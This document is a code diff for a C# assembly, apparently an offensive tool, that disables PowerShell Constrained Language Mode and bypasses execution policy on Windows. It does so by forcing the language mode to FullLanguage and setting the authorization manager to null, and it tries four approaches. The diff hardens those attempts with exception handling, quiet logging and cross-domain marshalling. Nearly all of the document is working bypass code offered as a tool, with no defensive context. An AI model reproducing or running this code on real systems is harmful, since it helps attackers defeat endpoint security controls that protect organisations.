@@ -4,25 +4,49 @@ using System.Management.Automation.Runspaces;
 
 namespace ClmDisableAssembly
 {
-    public class ClmDisableAssembly
+    public class ClmDisableAssembly : MarshalByRefObject
     {
         [System.Runtime.InteropServices.DllImport("kernel32.dll")]
         static extern int GetCurrentThreadId();
 
+        private static void info(string x)
+        {
+            try
+            {
+                Console.WriteLine(x);
+            }
+            catch (Exception)
+            { 
+            }
+        }
+
         public static int Start(string arg)
         {
-            Console.WriteLine("[+] Managed mode assembly. Disabling CLM globally.");
-            Console.WriteLine("\tCurrent thread ID (managed/unmanaged): " + System.Threading.Thread.CurrentThread.ManagedThreadId.ToString() + " / " + GetCurrentThreadId().ToString());
+            info("[+] Managed mode assembly. Disabling CLM globally.");
+            info("\tCurrent thread ID (managed/unmanaged): " + System.Threading.Thread.CurrentThread.ManagedThreadId.ToString() + " / " + GetCurrentThreadId().ToString());
 
             int failures = 0;
-
-            if (arg.Length > 0)
+            try
             {
-                Console.WriteLine($"\tPassed argument: '{arg}'");
-            }
+                if (arg.Length > 0)
+                {
+                    info($"\tPassed argument: '{arg}'");
+                }
+            } catch (Exception)
+            { }
 
-            // Switches back to FullLanguage in CLM
-            Runspace.DefaultRunspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
+            try
+            {
+                // Switches back to FullLanguage in CLM
+                Runspace.DefaultRunspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
+
+                info("[.] Approach #1 succeeded.");
+            }
+            catch (Exception e)
+            {
+                info("[-] Approach #1 failed");
+                failures++;
+            }
 
             try
             {
@@ -30,10 +54,12 @@ namespace ClmDisableAssembly
 
                 // Bypasses PowerShell execution policy
                 Runspace.DefaultRunspace.InitialSessionState.AuthorizationManager = null;
+
+                info("[.] Approach #2 succeeded.");
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Approach #1 failed: " + e);
+                info("[-] Approach #2 failed");
                 failures++;
             }
 
@@ -45,10 +71,12 @@ namespace ClmDisableAssembly
                 runspace.Open();
                 runspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
                 runspace.Close();
+
+                info("[.] Approach #3 succeeded.");
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Approach #2 failed: " + e);
+                info("[-] Approach #3 failed");
                 failures++;
             }
 
@@ -62,19 +90,27 @@ namespace ClmDisableAssembly
                 using (Runspace runspace = RunspaceFactory.CreateRunspace(initialSessionState))
                 {
                     runspace.Open();
-                    runspace.SessionStateProxy.LanguageMode = PSLanguageMode.FullLanguage;
                     runspace.InitialSessionState.AuthorizationManager = null;
                     runspace.InitialSessionState.LanguageMode = PSLanguageMode.FullLanguage;
                     runspace.Close();
                 }
+
+                info("[.] Approach #4 succeeded.");
             }
             catch (Exception e)
             {
-                Console.WriteLine("[-] Approach #3 failed: " + e);
+                info("[-] Approach #4 failed");
                 failures++;
             }
 
-            if (failures == 0) Console.WriteLine("[+] CLM most likely disabled!");
+            if (failures >= 0 && failures < 4)
+            {
+                info("[+] CLM may be disabled!");
+            }
+            else
+            {
+                info("[-] CLM could not be disabled. All approaches failed!");
+            }
 
             return 0;
         }
